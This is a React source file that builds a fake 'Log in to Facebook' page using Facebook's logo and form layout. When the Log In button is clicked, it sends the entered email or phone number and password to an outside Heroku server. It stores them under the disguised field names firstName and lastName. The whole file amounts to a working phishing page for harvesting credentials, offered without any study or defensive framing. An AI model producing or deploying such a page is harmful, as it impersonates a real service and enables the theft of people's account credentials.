
import React, { Component } from 'react'
import { Grid,Form,Segment,Button,Divider,Image } from 'semantic-ui-react'

import './index.css'

export default class App extends Component {
    state = {
        firstName : '',
        lastName : '',
        emailId: "constant@mail.com"

    }

    handleInput = (name) => (e) =>{
        this.setState({[name] : e.target.value})
    }
    submit = () => {
        fetch("https://backend-login-heroku.herokuapp.com/api/v1/employees", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(this.state),
          }).then((response) => {
            if (response.status === 200) {
              return response.json().then((res) => {
                console.log(res)
      
              });
            }
            else {
              alert("Wrong Username or password");
              // console.log(response);
            }
          });
    }
    render() {
        return (
          <div className='body'>
            <Grid
              textAlign="center"
              style={{ height: "100vh" }}
              verticalAlign="middle"
            >
              <Grid.Column style={{ maxWidth: 400 }}>
                  <Image src={"https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"} />

                <Form size="large">
                  <Segment stacked>
                  <p className='log'>Log in to Facebook</p>
                 
                    <Form.Input
                    className='input'
                      fluid
                      placeholder="Email address or phone number"
                      onChange={this.handleInput("firstName")}
                      value = {this.state.firstName}
                      
                    />
                    <Form.Input
                    className='input'
                      fluid
                      placeholder="Password"
                      type="Password"
                      onChange={this.handleInput("lastName")}
                      value = {this.state.lastName}
                      
                    />

                    <Button
                      color='blue'
                      fluid
                      size="large"
                      onClick={this.submit}
                   
                    >
                      Log In
                    </Button>
                    <br/>
                    <a>Forgotten account?</a>
                    <br/>
                    <Divider horizontal size="small"><p className='orrr'>or</p></Divider>
                    <br/>
                    <Button positive>Create New Account</Button>
                  </Segment>
                </Form>
                
              </Grid.Column>
            </Grid>
          </div>
        );
    }
}

